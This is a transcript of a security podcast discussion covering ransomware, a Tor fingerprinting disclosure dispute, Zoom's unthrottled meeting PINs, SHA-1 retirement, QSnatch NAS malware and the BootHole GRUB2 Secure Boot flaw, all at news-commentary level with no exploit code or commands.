LEO:  This is an implication that Garmin didn't have a copy of its data?



STEVE:  Well, I've seen reports.  There was another firm - I can't remember.  It was also in the news last week.  They had 30,000 workstations encrypted.  That demand started also at 10 million.  They ended up settling, if you can call it that, to 4.5.  So the negotiation through an intermediary came out at 4.5.  I don't remember now the name of the company.



LEO:  Because even if you did this, maybe, oh, it's 3,000 workstations, it'd be cheaper to pay and have them decrypted and then just working again.  But would you ever trust that station?  You wouldn't.



STEVE:  That's exactly the problem.



LEO:  You're still going to have to wipe it and reinstall everything, no matter what you pay.



STEVE:  Yup.



LEO:  I just don't get it.  I'm missing something.



STEVE:  Well, my feeling is, I mean, certainly anybody now would have protection against, you know, like their main corporate databases would be secure.  But it might just be that they're not doing nightly backups, like nightly images or incrementals of every single workstation in the organization.  And so, you know...



LEO:  Right.  Well, they should.



STEVE:  Exactly. 



LEO:  You should have cold backups; right?  You don't want hot backups because those could back up the encryption.



STEVE:  Right.



LEO:  But this is well-known technology.  This is not difficult to do.



STEVE:  True.  I just think it's a matter of logistics.  Like a large company sort of, you know, the IT department is busy running around remediating all manner of individual things.  And it's like, okay, that's on our to-do list.  Well, you know, I hope the industry is changing the priorities of these things because they really do need to get done.  



LEO:  Well, especially now.  I mean, it's so obvious this is going to be a big business issue.



STEVE:  It is becoming big business.  



LEO:  Yeah.



STEVE:  So the Tor project has recently been in a bit of back-and-forth with a security researcher by the name of Dr. Neal Krawetz.  Neal obtained his Ph.D. in Computer Science from Texas A&M and his bachelor's from UC Santa Cruz.  He has a long history of finding and reporting problems with the Tor Network, and he operates multiple Tor nodes himself.  From looking over the history of this, he appears to have long been a bit of a thorn in the side of the Tor engineers, and frankly not all of his concerns over Tor's privacy guarantees appear to warrant undue concern.



For example, he wrote at one point over, well, in fact, in ramping up to his decision finally to disclose something without Tor's permission.  He said:  "Over three years ago, I tried to report a vulnerability in the Tor Browser to the Tor Project.  The bug is simple enough.  Using JavaScript, you can identify the scrollbar width.  Each operating system has a different default scrollbar size, so an attacker can identify the underlying operating system.  This is a distinct attribute that can be used to help uniquely track Tor users."  And he says in parens:  "(Many users think that Tor makes them anonymous. But Tor users can be tracked online.  They are not anonymous.)"



So anyway, okay.  In three years, despite trying, he had not managed to get this fixed.  During that time the Tor Project joined HackerOne, you know, the firm that we've talked about often, for creating bug bounties, and officially credited him for the discovery of this problem, the fact that JavaScript running in a browser could determine the width of the scroll bar.  Okay.  They credit him with the discovery of that, and I don't know whether he received any monetary payment.  But the resolution of this was deferred from Tor to Mozilla, since after all the Tor browser is based on Firefox, and that's Mozilla's baby.



After some length of time doing nothing with this, it was dropped, just the guy to whom it was assigned deassigned himself from it, and that upset the good doctor.  And of course we've seen instances of this before where a security researcher finds a problem that he or she believes to be highly critical and that needs everyone's attention right away, you know, if not yesterday.  But for whatever reason they don't obtain the satisfaction that they're looking for from the affected parties.  They feel unappreciated for their efforts, stiffed and ignored.



So then what comes next?  In the case of this Dr. Neal Krawetz, under the subheading "Dropping Zero-Days," he now explains on his most recent blog posting, and in fact he uses the definition that I don't agree with.  He starts off:  "A 'zero-day' is any exploit that has no known patch or widespread solution."  And of course, as we know, I disagree with that.  I think that it's just an unknown vulnerability unless and until it is found to be exploited.



Anyway, he continues:  "A zero-day doesn't need to be unique or novel; it just needs to have no solution."  He says:  "I'm currently sitting on dozens of zero-days for the Tor browser and Tor network."  He says:  "Since the Tor Project does not respond to security vulnerabilities" - and in fact they do - "I'm just going to start making them public.  While I found each of these on my own, I know that I'm not the first person to find many of them."  Well, okay.  He infers that, I suppose.



So here we have the unfortunate phenomenon of the security researcher whose original white hat begins to dim as his or her work doesn't receive the attention they believe it deserves.  So he continues:  "The scrollbar profiling vulnerability is an example of a zero-day in the Tor browser."  And I'll just say as an aside, we can hope that all of these other dozens of zero-days are of similar impact.  He says:  "But there are also zero-days for the Tor network.  One zero-day for the Tor network was reported by me to the Tor Project on December 27th, 2017," he says in parens, "(about 2.5 years ago).  The Tor Project closed it out as a known issue, won't fix, and informative."



He says:  "Let's start with a basic premise.  Let's say you're like some of my clients.  You're a big corporation with an  explicit 'No Tor on the corporate network' rule.  This is usually done to mitigate the risks from malware.  For example, most corporations have a scanning proxy for Internet traffic that tries to flag and stop malware before it gets downloaded to a computer in the company.  Since Tor prevents the proxy from decoding network traffic and detecting malware, Tor is not permitted.  Similarly, Tor is often used for illegal activities."  And he cites child porn, drugs, et cetera.



"Blocking Tor reduces the risk from employees using Tor for illegal purposes.  Although denying Tor can also mitigate the risk from corporate espionage, that's usually a lesser risk than malware infections and legal concerns."  And he says:  "Keep in mind these same block and filtering requirements apply to nation-states like China and Syria that want to control and censor all network traffic."  He says:  "But I'm going to focus on the corporate environment."



"It's one thing to have a written policy that says 'Don't use Tor.'  However, it's much better to have a technical solution that enforces the policy.  So how do you stop Tor users from connecting to the Tor network?  The easy way, he says, is to download the list of Tor relays.  A network admin can add a fire rule blocking access to each Tor node."



Then he says:  "Zero-day number one," this apparently the beginning of dozens.  "Blocking Tor connections the smart way."  He says:  "There are two problems with the 'block them all' approach.  First, there are thousands of Tor nodes.  Checking each network connection against every possible Tor node takes time.  This is fine if you have a slow network or low traffic volume, but it doesn't scale well for high-volume networks.  Second, the list of nodes changes often.  This creates a race condition, where there may be many new Tor nodes that are seen by Tor users but aren't blocked by your network block list yet."



He says:  "However, what if there was a distinct packet signature provided by every Tor node that can be used to detect a Tor network connection?  Then you could set the filter to look for the signature and block all Tor connections.  As it turns out, this packet signature is not theoretical."  And then in his blog posting he goes on to describe in great detail Tor's TLS handshake and the unique properties which he found and told Tor about 2.5 years ago of the TLS certificates which Tor node servers generate on the fly.



Then he says, finally, he says:  "Validating the vulnerability.  Back in 2017, I used a scanner and Shodan to search for TLS certificates.  In theory, it's possible for there to be some server with a server-side TLS certificate that matches this signature, but that is not a Tor node.  In practice, every match found was a Tor node."  He said:  "I even found servers running the Tor daemon and with open onion routing ports that were not in the list of known Tor nodes."



He says:  "Some were non-public bridges.  Others were private Tor nodes.  Similarly, I scanned every known Tor node.  Each matched this Tor-specific signature profile.  That makes the detection 100% accurate, no false positives, no false negatives."  He says:  "Although now that I've made this public, someone could intentionally generate false-positive or false-negative certificates.  The false-positives are relatively easy to construct.  The false-negatives will require editing the Tor daemon's source code.



"While a scanner could be used to identify and document every Tor server," he says, "corporations don't need to do that.  Corporations already use stateful packet inspection on their network perimeters to scan for potential malware.  With a single rule, they can also check every new connection for this Tor signature.  Without using large lists of network addresses, you can spot every connection to a Tor node and shut it down" - that is, shut the connection down - "before the session layer (TLS) finishes initializing, and before any data is transferred out of the network."



So he then explains that he reported this discovery of a simple way of detecting and thus blocking all Tor traffic.  He said:  "I reported this simple way to detect Tor traffic to the Tor Project on" - as we said before - "27th of December, 2019, HackerOne bug #300826."  Meaning that HackerOne has acknowledged it, and presumably he's been paid a bounty for it.  He says:  "The response I got back was disappointing."  Or in fact maybe the response means he didn't get paid.



Tor replied:  "Hello, and thanks for reporting this issue!  This is a known issue affecting public bridges, the ones distributed via bridgedb.  See ticket #7349 for more details.  This issue does not affect private bridges, the ones that are distributed in a peer-to-peer ad hoc way.  As indicated in the ticket, to fix this problem, we are aiming to make it possible to shutdown the ORPort" - the onion routing port - "of Tor relays.  In our opinion, we should not try to imitate normal SSL certs because that's a fight we can't win.  They will always look different or have distinguishers, as has been the case in the pluggable transport arms race.  Unfortunately, ticket #7349 is not straightforward to implement and has various engineering complexities.  Please see the ticket for more information.  Due to the issue being known and planned to be fixed, I'm marking this issue as 'Informative.'"



So needless to say, the doctor was displeased, and his blog posting itemized his disagreements with this decision.  You have to take my word for it.  I won't go over them.  Then he concludes with some commentary on bug bounties and a promise for more zero-days, which I think are simply presently known vulnerabilities.  He wrote:  "More soon.  If you have ever worked with bug bounties, then you are certain to recognize the name Katie Moussouris."  And of course we've talked about her in the past.



"She created," he says, "the first bug bounty programs at Microsoft and the Department of Defense.  She was the Chief Policy Officer at HackerOne, the bug bounty service, and she spearheaded NTIA's Awareness and Adoption Group's effort to standardize vulnerability disclosure and reporting."  And he says, parens:  "(Full disclosure:  I was part of the same NTIA working group for a year.)"  He said:  "I found Katie to be a positive and upbeat person.  She is very sharp, fair-minded, and realistic."



So then he said:  "Earlier this month, Katie was interviewed by the Vergecast podcast."  He said:  "I had expected her to praise the benefits of vulnerability disclosure and bug bounty programs.  However, she surprised me.  She has become disenchanted by how corporations are using bug bounties.  She noted that corporate bug bounties have mostly been failures.  Companies often prefer to outsource liability rather than solve problems.  And they view the bug bounties as a way to pay for the bug and keep it quiet rather than fix the issue.



"Every problem that Katie brought up about the vulnerability disclosure process echoed my experience with the Tor Project.  The Tor Project made it hard to report vulnerabilities.  They failed to fix vulnerabilities.  They marked issues as 'resolved' when they were never fixed.  They outsourced simple issues, like passing a simple scrollbar issue upstream to Firefox where it is never fixed.  And they make excuses for not addressing serious security issues."  And we'll just note what he considers to be serious security issues.



"During the interview, she mentioned that researchers and people reporting vulnerabilities only have a few options:  try to report it, sell it, or go public."  He said:  "I've tried reporting and repeatedly failed.  I've sold working exploits, but I also know that they can be used against me and my systems if the core issues are not fixed.  And even the people who buy exploits from me would rather have these issues fixed.  That leaves public disclosure."  He says:  "In future blog posts, I will be disclosing more Tor zero-day vulnerabilities.  Most, but probably not all, are already known to the Tor Project.  I have a list of vulnerabilities ready to drop.  And for the Tor fan boys who think 'use bridges' will get around this certificate profiling exploit, don't worry.  I'll burn bridges next."



So anyway, I thought this story was interesting and worth covering and sharing with our listeners because it illuminates another facet of this weird security industry that we spend time looking at every week.  It's certainly the case that a vulnerability hunter lacks the ability to force their discoveries to be fixed.  But I think that forcing discoveries to be fixed is probably the wrong goal.  If after having been informed of it, an organization should choose not to repair a defect in their system for whatever reason, isn't that entirely their business?



I mean, I understand the ego involvement and the temptation to force the issue.  The security researcher is in possession of knowledge; the public is not.  But attempting to publicly shame an organization into bending to the attacker's will feels wrong, especially when that public shaming must, in order to be effective, inherently put other users of the organization's systems at some form of increased risk.  I mean, that's the nature of the shame.  So it's clear how a formal bug bounty program such as HackerOne could be abused by an organization to purchase and then sit on their bugs.  But again, isn't that exactly the right that they have purchased?  That's part of the bargain.  The bug hunter agrees not to disclose, and in return receives payment, both for the documentation of the discovered problem and for their continued silence about it.  What happens after that is no longer the hacker's business.  That information has been sold.



So anyway, I thought it was interesting.  I have not made time to listen to Katie's conversation with the Verge.  But if I find time and can find it, I think I will because I'm kind of curious to hear what someone who was a big proponent of this economic model for monetizing the work of investigators and, I mean, arguably resulting, as we've talked often about, you know, much heightened security overall for the industry.  I guess no system works perfectly all the time.  And I heard you sort of in some agreement in the background, Leo.



So I think that the core lesson of this next story is, in this day and age, in 2020 and beyond, it's truly necessary to do everything right.  Which brings us to the latest Zoom mistake.  And this one's not a bug.  It's a design mistake.  Back in April, in response to the flurry of interest in Zoom, both by the overworld, who wanted to use it, and the underworld, who wanted to abuse it, Zoom bombing, as we know, became a thing.  Which caused us to title an episode "Zoom Go Boom."



The trouble was that Zoom meetings were not required originally to have any kind of password protection.  Just the meeting code was sufficient to allow otherwise uninvited visitors to break into and disturb Zoom conferences of all kinds.  Zoom quickly responded by adding a six-digit PIN to protect entry into all recurring Zoom meetings.  And as we know, a six-digit PIN can provide some useful security.  After all, that's what our authenticators all use.  But it must be deployed with some care because it does not by itself provide much entropy.



And sure enough, Tom Anthony, the VP in charge of product at SearchPilot in the U.K., discovered that Zoom's implementation of six-digit PINs had made a classic rookie mistake.  And frankly, in this day and age, it's kind of unforgiveable.  But I'm sure they were in a hurry to close down the Zoom bombing problem.



Okay.  What Tom discovered, somewhat to his amazement, was that Zoom had failed to implement any sort of rate limiting to prevent high-speed brute-force guessing of these comparatively short six-digit numeric PINs.  Like I said, a rookie mistake.  As Tom wrote in his write-up, this enabled, he said, "an attacker to attempt all one million possible PINs in a matter of minutes and gain access to other people's private Zoom meetings."



So as we know, in the absence of any checks for repeated incorrect password attempts, which would lock out an IP, nor any rate limiting for mistakes, and really, when you think about it, correctly entering a six-digit PIN?  That's just not difficult to get right, if you know what it is.  So it would make sense for the entry system to be highly intolerant of what is clearly guessing.  So none of that was present.  So an attacker could leverage Zoom's web client.  And remember, it's a simple URL, https://zoom.us/j/, then the meeting ID, to continuously send these HTTP requests until one million combinations have been tried.



And he noted, with improved threading and distributing, the guessing clients across maybe four or five cloud servers, the entire six-digit, one million possible PIN space could be checked within a few minutes.  He responsibly reported this glaring oversight to Zoom on April 1st, along with a Python-based proof-of-concept script.  The next day, Zoom took their web client offline, since that was the largest and most glaring exploit vector.  And then a week later they fixed the flaw permanently and correctly.



So it's obviously good that this was caught early and fixed quickly.  But the lesson here is that this should never have happened in the first place.  The problem we have today is that truly important security pieces are still being implemented in an ad hoc fashion.  You know?  Like everyone is rolling their own, every time they need a solution.  They're still needing to reinvent the same wheel over and over again.  And this approach invites mistakes.  Even if people knew to do it right, I mean, it's unbelievable that somebody could, in this day and age, implement a six-digit PIN where no measure was taken to prevent brute forcing.  But that's what Zoom put online.



Today, every developer rolls their own web UI to suit their particular needs, so every one of them is different.  Everyone of them handles login a little differently.  There's no uniformity about passwords.  Can I use a special character?  How long can it be?  What if I forget it?  Everyone handles recovery slightly differently.  What we have today is a mess.  And not only does user convenience suffer, but so does security.  So it's going to be interesting to see how this gets resolved, you know, downstream.



We all know that I designed something that attempted to unify this process, but it's something that needs to get adopted.  A solution needs to get adopted industry-wide.  And it's going to have to be a solution that broadly solves the problems and that doesn't require everybody to reroll their own solution, or we're not going to get ahead of this.



The good news is, if this was April 1st, this was probably before the heavyweights got involved, and so this was still hopefully the original team at Zoom who said, well, you know, let's just create a quick solution.  We'll see.



Another SHA-1 deprecation.  In their posting titled "SHA-1 Windows content to be retired August 3rd, 2020" - in other words, since today's the 4th, that was yesterday - last week Microsoft made the following announcement.  They said:  "To support evolving industry security standards and continue to keep you protected and productive" - pardon me, that's assuming Windows 10 will boot, or that you could print after it does - "Microsoft will retire content that is Windows-signed for Secure Hash Algorithm 1 (SHA-1) from the Microsoft Download Center on August 3rd, 2020."



They said:  "This is the next step in our continued efforts to adopt Secure Hash Algorithm 2 (SHA-2), which better meets modern security requirements and offers added protections from common attack vectors.  SHA-1," they wrote, "is a legacy cryptographic hash that many in the security community believe is no longer secure.  Using the SHA-1 hashing algorithm in digital certificates could allow an attacker to spoof content, perform phishing attacks, or perform man-in-the-middle attacks.  Microsoft no longer uses SHA-1 to authenticate Windows operating system updates due to security concerns associated with the algorithm, and has provided the appropriate updates to move customers to SHA-2 as previously announced.  Accordingly, beginning in August 2019" - so a year ago - "devices without SHA-2 support have not received Windows updates.  If you are still reliant on SHA-1, we recommend that you move to a currently supported version of Windows and to stronger alternatives such as SHA-2."



The only consequence I can see this having would be those among us who have some reason to set up and update older versions of Windows.  For example, I was just recently testing SpinRite's forthcoming USB prep technology - which I, as we know, packaged as "InitDisk" - under Windows XP because it still needs to run there; and Windows 7, which continues to valiantly hold onto to a bit more than a quarter of the desktop market share.  Last time I looked it's at 26.72%.  It originally shipped without support for SHA-256, as did Windows XP.



So I wonder whether there will be a bit of a Catch-22 because there are Windows updates that are required to add SHA-256 support to Windows XP and Windows 7.  So they must still be signed with SHA-1 in order to allow SHA-256 support to be bootstrapped onto those earlier operating systems.  Fortunately, I long ago created kits of all the required files, so I'm okay.  And I imagine that that's also true for most others who have a similar interest in archaeology.  But I did, when I thought, whoa, SHA-1's going away?  Uh-oh.  Good thing I've got RAID-based archives in multiple places of those particular files that allow the older OSes to understand signing with SHA-256.  And, yeah, archaeology.



Speaking of which, QNAP and QSnatch.  QNAP Network Attached Storage devices, well, they've been giving their owners and the security industry some serious problems for nearly a year, though the troubles appear to date as far back as 2014, so six years.  We've touched on this before, but it's worthy of a brief  refresher because there's been a recent escalation in the breadth and depth of the attacks against still unpatched QNAS devices.  Last week the cybersecurity agencies in both the U.S. and the U.K. issued a joint advisory about a massive ongoing malware threat which is infecting the NAS appliances of QNAP, a Taiwanese-based company.



The malware goes by the name QSnatch, or for some reason Derek.  I'm reminded of that - have you seen the auto insurance commercial where the gal is talking to Bigfoot, and he's lamenting the fact that no one really cares about him anymore.



LEO:  Yes, his name is Derek, yes.  Bigfoot?  But my name's Derek.



STEVE:  So QSnatch, also known as Derek, is a credential and data-stealing malware which has compromised more than 62,000 devices since reports began last October.  There's a high degree of infection in North America and Western Europe.



LEO:  Oh, yeah.  We love them.  They're great.  But maybe not so great as they used to be.  But yeah.



STEVE:  Yeah.  So it's probably for the best that even today the exact infection vector is not publicly known.  It has not been disclosed.  But the U.S. Cybersecurity and Infrastructure Security Agency (CISA) and the U.K.'s National Cyber Security Centre (NCSC) wrote in their joint alert that "All QNAP NAS devices are potentially vulnerable to QSnatch malware if not updated with the latest security fixes."  And also that "Once a device has been infected, attackers can prevent admins from successfully running firmware updates."  So talk about a Catch-22.



QSnatch has an assortment of features which are implemented as modules.  Therefore the problems include, but are not necessarily limited to, a password logger which installs a fake device admin login page to spoof people into entering their credentials, which it then grabs; a more generic credential scraper; an SSH backdoor enabling the attackers to run arbitrary code on the infected devices; a web shell to provide malware operators with remote access to compromised NASes; and a data theft module which steals a predefined list of files, including logs and system configuration, and sends them in encrypted form to attacker-controlled servers.  So in other words, you don't want this to be running in your network attached storage.  But getting rid of it is tricky.  It requires multiple reboots, full firmware downloads, some sort of a malware-scraping utility, and more.



I've got a link to the QNAP advisory.  At QNAP they say:  "QSnatch collects confidential information from infected devices, such as login credentials and system configuration.  Due to these data breach concerns, QNAP devices that have been infected may still be vulnerable to reinfection after removing the malware."  In other words, don't just flush the malware, but then retain the use of your favorite passwords in the device for the sake, for example, of connectivity with other applications or users who may have and be using the previous credentials.



You should assume that a complete compromise of all the secrets in the device has already taken place, including all accounts on it.  And be also wary of any add-on software.  You know how lots of these network attached storage devices now you're able to install all sorts of other goodies.  Don't have any there that you're not using, and get rid of any that you're unsure about.  Anyway, it's a mess.  If you own a QNAP NAS, it's worth some time to make sure that it's clean.



My discussion last week of the forthcoming mass storage benchmark, which will be another development spinoff on the ongoing work toward SpinRite 6.1, it generated a lot of interest and feedback from our listeners.  Many people wanted to know where it was and how they could run it.  So I need to quickly note that even it, the benchmark, is still in development and not yet ready for general use.  And believe me when I say that at this point it would cause far more confusion, frustration, and questions than it would answer because it is just a development tool.  But as soon as it's ready for general purpose use, I will make it easy to find, and I will formally invite all of our listeners to experiment with it.



I mentioned last week that I was going to add further granularity to the benchmark to look at the timing of the individual 32MB transfers which make up the larger 1GB benchmark.  We did that, and the results were very interesting.  We definitely found spots where drives, both spinning and solid state, but interestingly primarily solid state, were a great deal slower to respond.  And in general we're seeing much more evidence that highly used regions of SSDs, typically at the front of the drive underneath the operating system, are consistently performing much more slowly, sometimes at as little as half the speed as compared to the unused areas.



We know that SSDs broadly employ two management schemes to compensate for the technology's inherent lack of write endurance.  They perform wear leveling, which dynamically relocates the data from the more highly used silicon to the lesser used regions.  And just as with hard drives, SSDs are also generously overprovisioned to allow regions that finally have been worn out to be replaced with fresh storage that had been set aside for that purpose.



So what we think we're seeing and that is being revealed by the benchmark could be the extra time being required for error correction, which would tend to be required to fix low bit count errors as memory is becoming fatigued.  And we might also be seeing evidence of some overhead associated with the management of what eventually becomes physically fragmented solid-state storage.  In any event, this doesn't appear to be something that there's much awareness of today, but this benchmark reveals it conclusively.  And I imagine that our listeners are going to find this fascinating.



So stay tuned.  I have a few more things to deal with, and then I'll be integrating this final AHCI driver part into the earlier IDE and compatibility and legacy mode drivers to produce a single result which should run on everybody's hardware, and then the fun will begin.



LEO:  Okay, Steve.  Shall I show the logo?  Look at that.  BootHole.



STEVE:  Yeah.  You think it was, like, preexisting artwork?



LEO:  That looks like clipart, yeah.



STEVE:  I guess maybe, yeah.



LEO:  It kind of does.  I don't know.  What do you think?  Maybe not the worm, but the boot, definitely.  The worm looks like somebody drew it themselves, kind of.  It's cute.  It's very cute.



STEVE:  So early in the history of this podcast, well before modern secure booting was actually invented, we talked about how truly insidious rootkits could be.  Remember those episodes, Leo?  We had a lot of fun with that.



LEO:  Oh, yeah.



STEVE:  Was it Sony that was hiding itself?



LEO:  Sony, yeah.



STEVE:  Crazy. 



LEO:  They put DRM in a rootkit.  That's a good idea.



STEVE:  Right.  By hooking, and basically just to hide its own files.  And in this case by hooking and subverting the operating system's own file system, a user could be looking right at a directory containing malicious malware and not see it.  You do a directory listing, and the rootkit's API hooks would filter out any and all appearance of any files it didn't want you or your AV or anything else to see.  You know, scanners wouldn't see it.  You wouldn't.  Nobody would see it.  But the files would still be right there, like in front of you, unseen.  So rootkits are a big problem when the goal is to have a truly trustworthy system.



And we've previously covered the concept of secure booting thoroughly over many previous podcasts, both in the context of securely booting a PC and also iOS that has a similar Secure Boot technology.  The idea is the establishment of a chain of trust which is anchored by some root component that can be absolutely trusted, and which is then able to examine and verify the trustworthiness of each and every subsequent stage of the booting process.  With secure booting enabled, the integrity of the resulting system is supposed to be assured and something that you can assume.



So when two researchers - Mickey, looks like Shkatov, and Jesse Michael, both at Eclypsium - announced their discovery of a vulnerability which they called BootHole in the GRUB2 bootloader used by most Linux systems, which can be used to gain arbitrary code execution during the boot process even with Secure Boot enabled, this understandably generated quite a stir within the security industry.  This meant that attackers could exploit this vulnerability to break boot security and install persistent and stealthy bootkits - and bootkits are another name for rootkits, essentially - to provide near total control over the victim device.  GRUB, G-R-U-B, stands for Grand Unified Bootloader.



I've got a link to their full description, a PDF link in the show notes.  But in their disclosure of this, they give a nice summary.  They wrote:  "The vulnerability affects systems using Secure Boot, even if they are not using GRUB2.  Almost all signed versions of GRUB2 are vulnerable" - and there's one that isn't, but otherwise they're all known to be vulnerable - "meaning virtually every Linux distribution is affected.  In addition, GRUB2 supports other operating systems, kernels and hypervisors such as Xen.



"The problem also extends to any Windows device that uses Secure Boot with the standard Microsoft 3rd Party UEFI Certificate Authority.  Thus the majority of laptops, desktops, servers, and workstations are affected, as well as network appliances and other special purpose equipment used in industrial, healthcare, financial, and other industries.  This vulnerability makes these devices susceptible to attackers such as the threat actors recently discovered using malicious UEFI bootloaders."  In other words - this is me speaking - the idea of corrupting a system's boot is not just theoretical, it is actively happening in the wild today.



So they continue:  "Eclypsium has coordinated the responsible disclosure of this vulnerability with a variety of industry entities, including OS vendors, computer manufacturers, and cybersecurity emergency response teams.  Mitigation will require new bootloaders to be signed and deployed, and vulnerable bootloaders should be revoked to prevent adversaries from using older, vulnerable versions in an attack."  In other words, the bootloaders, the vulnerable bootloaders are currently signed and trusted by the root of trust in the UEFI on the motherboard.  So this is an instance where revocation of some form is required.  They finish:  "This will be a long process and considerable time for organizations to complete patching."  In other words, this is a big whoopsie. 



However, nobody should go out and fix this right now.  We'll get to why in a second, because it is actually causing way more problems than it is worth.  I'm going to cut to the chase here because part two of this is what has happened since.  In their disclosure document, they explain the problem.  They said:  "In the course of Eclypsium's analysis, we have identified" - guess what - "a buffer overflow vulnerability in the way GRUB2 parses content from the GRUB2 config file named grub.cfg."  They said:  "Of note, the GRUB2 config file is a text file and typically is not signed like other files and executables."  And I'll note that that one GRUB2 that I mentioned that is not vulnerable to this is not vulnerable because it requires the grub.cfg to be signed.



So they said:  "This vulnerability" - this buffer overflow in the parsing of grub.cfg - "enables arbitrary code execution within GRUB2 and thus control over the booting of the operating system.  As a result, an attacker could modify the contents of the GRUB2 configuration file to ensure that attack code is run before the operating system is loaded.  In this way, attackers gain persistence on the device.



"Such an attack would require an attacker to have elevated privileges.  However, it would provide the attacker with a powerful additional escalation of privilege and persistence on the device, even with Secure Boot enabled and properly performing signature verification on all loaded executables.  One of the explicit design goals of Secure Boot is to prevent unauthorized code, even running with admin privileges, from gaining additional privileges and pre-OS persistence by disabling Secure Boot or otherwise modifying the boot chain.



"With the sole exception of one bootable tool vendor who added custom code to perform a signature verification of the grub.cfg config file in addition to the signature verification performed on the GRUB2 executable, all versions of GRUB2 that load commands from an external grub.cfg config file are vulnerable.  As such, this will require the release of new installers and bootloaders for all versions of Linux."  In other words, this is not a quick, easy, small fix.



"Vendors will need to release new versions of their bootloader shims to be signed by the Microsoft 3rd Party UEFI Certificate Authority.  It is important to note that until all affected versions are added to the dbx revocation list" - and I'll explain that in a second - "an attacker would be able to use a vulnerable version of shim and GRUB2 to attack the system.  This means that every device that trusts the Microsoft 3rd Party UEFI Certificate Authority will be vulnerable for that period of time."



Okay.  So first, as regards the buffer overflow, UEFI does not employ address space layout randomization, data execution prevention, or any of the other common exploit mitigation protections that have fortunately become standard in our operating systems.  This means that weaponizing this buffer overflow will be trivial for attackers who already have a foothold on the targeted computer to exploit the flaw.



LEO:  By the way, underline that part, "who already have access to the attacked computer."



STEVE:  Yes, exactly.  That's why nobody needs to actually huff and puff and run around in circles and worry about this.



LEO:  Incidentally, I've never installed Linux without turning off Secure Boot because most Linuxes aren't signed.



STEVE:  Right.  It gets in the way, exactly.



LEO:  Yeah.  So this would be for enterprise users who are using signed Linuxes and so forth.



STEVE:  Correct.  Well, and for example, it is Red Hat Enterprise Linux that has been found to have a problem.  We'll get there in a second.  But I was going to say that GRUB2 is also open source, and that we already have full open documentation of the problem.  So bad guys, you know, maybe there will be a bit of a race.  But again, Leo, as you highlighted, this requires modifying a config file that is stored in the UEFI that no one can get to unless they have physical access to the system or already have elevated privileges.



LEO:  Right.



STEVE:  So it makes a serious problem worse and persistent.  And if you didn't know if you had this, if something got into your system and you had it, could arrange persistence that a reformat of your hard drive would not resolve.



LEO:  That's the key.  Yeah, that's good, yeah.



STEVE:  Yeah.  So we talked about this before, but it's worth noting that, thankfully, the Secure Boot system was understood to require, from the beginning, some form of truly effective revocation mechanism.  Not the mess that we have with our browser certificates.  So every UEFI system which supports Secure Boot contains a pair of protected databases.  The "Allow DB," which is just called "db," lists the approved components, and the "Disallow DB," which is called "dbx," contains a list of known vulnerable or malicious components including firmware, drivers, and bootloaders.



So what this means is that all previously vulnerable bootloading components, all of these GRUB, the various GRUB2s that are out there and are signed and are trusted and are now known to be exploitable, they all have to be added to the Disallow DB so that a bad guy who does get this kind of access can't swap out your good GRUB2 for one of these bad GRUB2s.  So it's a big problem to remediate.  And this has to happen to every single motherboard where trusted Secure Boot wants to be used.



But Leo, wait.  There's more.  And it's, like, oh my god more.  In response to Eclypsium's initial vulnerability report, the GRUB2 code came under additional and, as it turns out, very much needed scrutiny.  A distressing number of additional vulnerabilities were then discovered by the Canonical security team.  CVE-2020, and I'll skip that preamble from now on, 14308 GRUB2:  grub_malloc does not validate allocation size, allowing for arithmetic overflow and subsequent heap-based overflow.  14309 GRUB 2:  Integer overflow in grub_squash_read_symlink may lead to heap-based overflow.



14310:  Integer overflow read_section_from_string may lead to heap-based overflow.  14311:  Integer overflow in grub_ext2_read_link leads to heap-based buffer overflow.  15705:  Avoid loading unsigned kernels when GRUB is booted directly under Secure Boot without a shim.  15706 script:  Avoid a use-after-free when redefining a function during execution.  And, finally, 15707, what is it, the seventh?  Yes, the seventh additional CVE:  Integer overflow in initrd size handling.



So, yes, GRUB2 turns out to have had a lot of problems, and it finally came to the security industry's attention.  And given the difficulty of this scale, this kind of ecosystem-wide update and revocation, there is a strong desire to avoid having to do this again in six months, so a large effort spanning multiple security teams at Oracle, Red Hat, Canonical, VMware, and Debian, using static analysis tools and manual code review, have identified and fixed dozens of additional vulnerabilities and dangerous operations throughout this GRUB2 codebase that do not yet have additional or have individual CVEs assigned.  So yeah, Leo, you might as well have just turned off Secure Boot because I don't think it was really doing anything anyway.



LEO:  That secure anyway, yeah.



STEVE:  So what needs to be done now to fully respond to the revelation after this flaw?  Broadly, five things, and don't do them.  Updates to GRUB2 to address the vulnerability.  Don't do that.  Linux distributions and other vendors using GRUB2 will need to update their installers, bootloaders, and shims.  And actually they will need to reupdate them.  New shims will need to be signed by the Microsoft 3rd Party UEFI Certificate Authority.  Administrators of affected devices will need to update installed versions of operating systems in the field, as well as installer images, including disaster recovery media.  And don't do that yet.  Eventually, the UEFI revocation list (dbx) needs to be updated in the firmware of each affected system to prevent running any of the previously trusted, now known to be insanely vulnerable, code during boot.



We never talked about the need for shims, and I've used that term a couple of times.  Open source projects and other third parties create a small app called a "shim."  It works, well, it contains the vendor's certificate and code that verifies and runs the bootloader.  The vendor's shim is verified using the Microsoft 3rd Party UEFI Certificate Authority, and then the shim loads and verifies the GRUB2 bootloader using the vendor certificate embedded inside the shim.  In other words, it's a means of installing essentially a third-party certificate, which is then used by other projects like open source projects, which are signed by that so that they're able to participate in this whole Secure Boot project, as well.



While it's certainly true that Secure Boot should be made as secure as we can make it, some knowledgeable security industry insiders feel that way too much ado is being made of this whole thing.  Set aside the fact that it was also badly broken initially.  We'll get there in a second.  But we know of HD Moore.  He's the widely acknowledged expert in vulnerability exploitation who was the original developer of the Metasploit framework.



He told Ars Technica's Dan Goodin in an interview, he said:  "I'd argue that Secure Boot is not the foundation of PC security today because it is rarely effective; and, by Eclypsium's own claim, it has been easy to bypass for over a year now, with no long-term fixes in sight.  I'm not sure what the buffer overflow in GRUB2 is useful for, since there are other problems if the grub.cfg is unsigned.  It may be useful as a malware vector; but even then there is no reason to exploit a buffer overflow when a custom grub.cfg file can be simply used to chain load the real operating system."  He's saying, in other words, if you're going to change GRUB2, why bother with a buffer overflow?  Just have it load something else of your choice first.



So, still, we want GRUB2 to be as secure as it can be, as you said, Leo, for enterprise environments.  And there's an aspect of this that's reminiscent of Spectre and Meltdown, as I mentioned, where the cure is arguably worse than the problem because Red Hat's patch to GRUB2 and the kernel, once applied, is now rendering those systems completely unbootable.  The issue has been confirmed to affect Red Hat Enterprise Linux 7.8 and 8.2, and may also affect 8.1 and 7.9.  The derivative distribution CentOS is also affected.



